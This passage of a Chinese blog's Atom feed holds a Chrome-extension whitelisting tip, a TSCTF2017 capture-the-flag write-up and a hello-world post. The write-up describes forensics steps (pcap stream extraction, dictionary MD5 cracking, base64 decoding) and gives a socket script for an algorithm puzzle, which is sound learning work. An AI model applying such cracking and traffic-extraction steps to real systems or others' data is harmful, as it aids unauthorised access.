class="headerlink" title="启用扩展程序"></a>启用扩展程序</h1><p>双击 <strong>Google-Google Chrome-扩展程序-配置扩展程序安装白名单</strong></p><p><strong>启用</strong>后，在左下角选项中点击 <strong>显示</strong> ，将在Chrome扩展程序页面(chrome://extensions/)上所禁程序的ID填入即可。</p><p><img src="http://blog-1252791275.pictj.myqcloud.com/ChromeExtension.png" alt="img"></p><hr><p>参考:<a href="https://hencolle.com/2016/10/16/baidu_exporter/" target="_blank" rel="noopener">https://hencolle.com/2016/10/16/baidu_exporter/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Chrome 会强制停用不是扩展商店中的应用，可通过修改组策略解决。&lt;/p&gt;
    
    </summary>
    
      <category term="Life" scheme="https://www.hydewww.cn/categories/Life/"/>
    
    
      <category term="chrome extension" scheme="https://www.hydewww.cn/tags/chrome-extension/"/>
    
  </entry>
  
  <entry>
    <title>TSCTF2017 Writeup</title>
    <link href="https://www.hydewww.cn/TSCTF2017/"/>
    <id>https://www.hydewww.cn/TSCTF2017/</id>
    <published>2017-05-16T16:00:00.000Z</published>
    <updated>2017-05-16T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加CTF，一个星期的突击其实还不如比赛两天中学到的多233。总共只做出2道Misc和全部Coding题（<del>这真的是ctf？</del>），四维码那题没做出来非常遗憾。36个小时确实有点肝不动，不过学到了很多，写篇wp总结一下。</p><a id="more"></a><p>以下题目及文件可在github上看到:<a href="https://github.com/hydewww/TSCTF2017-WP" target="_blank" rel="noopener">https://github.com/hydewww/TSCTF2017-WP</a> ，里面也有此次的全部题目（除Web）及前十队伍的Wp。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><hr><h3 id="Logo"><a href="#Logo" class="headerlink" title="Logo"></a>Logo</h3><p><img src="http://blog-1252791275.pictj.myqcloud.com/Logo.png" alt="logo"></p><p>用Hex查看 图片信息结束后是一串字符 结尾是== 用base64解密得到flag</p><h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>pcapng格式，百度得知是wireshark文件。跟着百度现学现卖，follow tcp流，总共有4组Stream。</p><ol><li>Stream2是Md5密文 带有字典 MD5Crack得密码ah%kyq$<br><img src="http://blog-1252791275.pictj.myqcloud.com/image001.png" alt="1"></li><li>Stream3开头为PK… Zip格式 用winhex拉出来得到加密的zip<br><img src="http://blog-1252791275.pictj.myqcloud.com/image002.jpg" alt="2"></li><li>输入密码得到flag.txt base64解密得flag<br><img src="http://blog-1252791275.pictj.myqcloud.com/image003.png" alt="3"></li></ol><h3 id="四维码（未完成）"><a href="#四维码（未完成）" class="headerlink" title="四维码（未完成）"></a>四维码（未完成）</h3><blockquote><p>你听说过四维码么？听说每拿到一个新码你就离成功进了一步哦！</p></blockquote><blockquote><p>HINT 1:Base32<br>HINT 2:如果脑洞不够大，多用搜索引擎搜搜看！<br>HINT 3:谷歌搜图？</p></blockquote><p><img src="http://blog-1252791275.pictj.myqcloud.com/%E5%9B%9B%E7%BB%B4%E7%A0%811.gif" alt="1"></p><ol><li>图1为13帧的二维码gif 每帧扫码得两位组合<a href="https://www.hydewww.cn/20170517/TSCTF2017/www.twitter.com/pinkotsctf">www.twitter.com/pinkotsctf</a> 得图2</li></ol><p><img src="http://blog-1252791275.pictj.myqcloud.com/%E5%9B%9B%E7%BB%B4%E7%A0%812.png" alt="2"></p><ol><li>扫套娃的二维码得NNSXSPLROJRW6ZDF<br>根据hint2 3 谷歌搜图搜到玄武实验室 再跳转到github上的matroschka加密算法<br><a href="https://github.com/fbngrm/Matroschka" target="_blank" rel="noopener">https://github.com/fbngrm/Matroschka</a> 看readme得知需要password</li></ol><p><img src="http://blog-1252791275.pictj.myqcloud.com/%E5%9B%9B%E7%BB%B4%E7%A0%813%20secret-image.png" alt="3"></p><ol><li>图三可看出是二维码 用stegsolve加深后可得一串二进制 共231位</li></ol><ul><li>猜想1：33<em>7 补一位转换ascii 一堆控制符 gg猜想2：新的二维码 经百度二维码最小的version1为21</em>21 gg</li><li>猜想3：条形码 做不下去 gg（结果就是条形码，不知道的可看github中学长的wp）</li></ul><h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><hr><h3 id="Python-amp-Socket"><a href="#Python-amp-Socket" class="headerlink" title="Python &amp; Socket"></a>Python &amp; Socket</h3><ul><li>Py3中sock.send()只能传输bytes ，经问学长后答题格式应为sock.send(String+”\n”)，故改用py2。</li><li>scok有时间限制，需在算法和sleep的时间上优化。题目大部分可通过搜索引擎得到c语言的解法，理解后改为python。</li><li>若sleep时间过短，rec不到全部的数据，需按需求变更。有时算法多跑几次就能跑出来，对sock理解不够，不知道原因<em>(:з)∠)</em></li><li>Rec后得到数据，需用正则表达式得到所需的数字进行运算。</li><li>由于难点主要是socket，所以只贴第一题的代码参考,其他题解可看github。代码有改动，可能跟截图显示的效果不符。</li></ul><h3 id="小明二进制"><a href="#小明二进制" class="headerlink" title="小明二进制"></a>小明二进制</h3><blockquote><p>小明发现，有些整数，它们十进制表示的时候，数的每一位只能是0或者1。例如0，1，110，11001都是这样的数，而2，13，900不是，因为这些数的某些位还包含0、1以外的数。小明将这些各位只为1或者0的数，命名为“小明二进制”。<br>现每轮给出一个整数n，计算一下最少要用多少个“小明二进制”数相加才能得到n，总共50轮。 如13可以表示为13个1相加，也可以13=10+1+1+1，或者13=11+1+1，所以13最少需要3个“小明二进制”数相加才能得到。</p></blockquote><p>最大的数码即为所需的n (<del>只有这题是自己想的算法</del>）</p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image013.png" alt="image"></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image014.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import math</span><br><span class="line"># 1 Socket Init</span><br><span class="line"># 1.1 Set Host and Port</span><br><span class="line">HOST = &apos;10.105.42.5&apos;</span><br><span class="line">PORT = 41111</span><br><span class="line"># 1.2 Connect to Server</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line"># 2 Receive the Message from Server</span><br><span class="line"># [sleep() before recv() is necessary]</span><br><span class="line">time.sleep(0.1)</span><br><span class="line">response = sock.recv(1024)</span><br><span class="line">response = response.decode(&apos;utf-8&apos;)</span><br><span class="line">print (response)</span><br><span class="line"># 正则表达式抓取数字</span><br><span class="line">m = re.findall(r&apos;(\w*[0-9]+)\w*&apos;,response)</span><br><span class="line">a = int(m[2])</span><br><span class="line">max = 0</span><br><span class="line">while(a&gt;0):</span><br><span class="line">    if(max&lt;a%10):</span><br><span class="line">        max=a%10</span><br><span class="line">    a//=10</span><br><span class="line"># 3 Send the Answer to Server</span><br><span class="line">sock.send(str(max)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">#由于第一次数是第3个，之后为第2个(从0开始)，故第一次单独执行，剩余49次循环</span><br><span class="line"></span><br><span class="line">for i in range (49):</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    response = sock.recv(1024)</span><br><span class="line">    response = response.decode(&apos;utf-8&apos;)   </span><br><span class="line">    m = re.findall(r&apos;(\w*[0-9]+)\w*&apos;,response)</span><br><span class="line">    print (response)</span><br><span class="line">    a = int(m[1])</span><br><span class="line">    print (a)</span><br><span class="line">    max=0</span><br><span class="line">    while(a&gt;0):</span><br><span class="line">        if(max&lt;a%10):</span><br><span class="line">            max=a%10</span><br><span class="line">        a//=10</span><br><span class="line">    sock.send(str(max)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line"># 4 Receive the Flag from Server</span><br><span class="line">time.sleep(0.01)</span><br><span class="line">response = sock.recv(1024)</span><br><span class="line">print (response)</span><br><span class="line"></span><br><span class="line"># 5 Close the Socket</span><br><span class="line">sock.close()</span><br><span class="line">time.sleep(0.001)</span><br></pre></td></tr></table></figure><h3 id="泽哥的算术"><a href="#泽哥的算术" class="headerlink" title="泽哥的算术"></a>泽哥的算术</h3><blockquote><p>泽哥的数学不是很好，有一天老师给泽哥布置了五十道数学题，要求他在10s内给出A的B次幂的后四位，你能算的出来吗？ example input : 123 234 output : 6809</p></blockquote><p>快速幂算法</p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image011.png" alt="image"></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image012.png" alt="image"></p><h3 id="Las-Vegas"><a href="#Las-Vegas" class="headerlink" title="Las Vegas"></a>Las Vegas</h3><blockquote><p>在Las Vegas，霸哥想跟我们玩个简单的取石子游戏，规则如下：游戏给出数字A B,双方轮流从A个石子中取走石子，每次不能超过B个，谁能取走最后一个石子谁就算赢。双方需要完成50轮游戏</p></blockquote><p>取石子游戏：<a href="http://blog.csdn.net/pipisorry/article/details/39249337" target="_blank" rel="noopener">http://blog.csdn.net/pipisorry/article/details/39249337</a></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image015.png" alt="image"></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image016.png" alt="image"></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image017.png" alt="image"></p><h3 id="修路"><a href="#修路" class="headerlink" title="修路"></a>修路</h3><blockquote><p>市政府决定在1000个村子(1,2,3,4….1000)间修些路来方便大家出行，市长决定在录用你之前进行一次考察，题目给出800条连通道路信息，再做1000次询问，要求给出村子A与B之间是否连通，是回答”yes”，否回答”no”。</p></blockquote><p><img src="http://blog-1252791275.pictj.myqcloud.com/image019.jpg" alt="image"></p><p><img src="http://blog-1252791275.pictj.myqcloud.com/image020.png" alt="image"></p><p>并查集：<a href="http://blog.csdn.net/dm_vincent/article/details/7655764" target="_blank" rel="noopener">http://blog.csdn.net/dm_vincent/article/details/7655764</a></p><p>获取800条数据时需rec(7*1024)才能一次读完</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次参加CTF，一个星期的突击其实还不如比赛两天中学到的多233。总共只做出2道Misc和全部Coding题（&lt;del&gt;这真的是ctf？&lt;/del&gt;），四维码那题没做出来非常遗憾。36个小时确实有点肝不动，不过学到了很多，写篇wp总结一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Security" scheme="https://www.hydewww.cn/categories/Security/"/>
    
    
      <category term="CTF" scheme="https://www.hydewww.cn/tags/CTF/"/>
    
      <category term="TSCTF2017" scheme="https://www.hydewww.cn/tags/TSCTF2017/"/>
    
      <category term="Writeup" scheme="https://www.hydewww.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Real · Hello World</title>
    <link href="https://www.hydewww.cn/hello_world/"/>
    <id>https://www.hydewww.cn/hello_world/</id>
    <published>2017-05-15T16:00:00.000Z</published>
    <updated>2017-05-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>啃了一天终于搭建好了Github Page，随便写点东西学习下markdown</p><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ printf(&quot;hello,world&quot;);</span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ print (&quot;hello,world&quot;)</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ System.out.print(&quot;hello,world&quot;);</span><br></pre></td></tr></table></figure><p>顺便github主页: <a href="https://github.com/hydewww" target="_blank" rel="noopener">https://github.com/hydewww</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;啃了一天终于搭建好了Github Page，随便写点东西学习下markdown&lt;/p&gt;
&lt;h2 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C&quot;&gt;&lt;/a&gt;C&lt;/h2&gt;&lt;figure class=&quot;highlight plain
      
    
    </summary>
    
    
  </entry>
  
</feed>
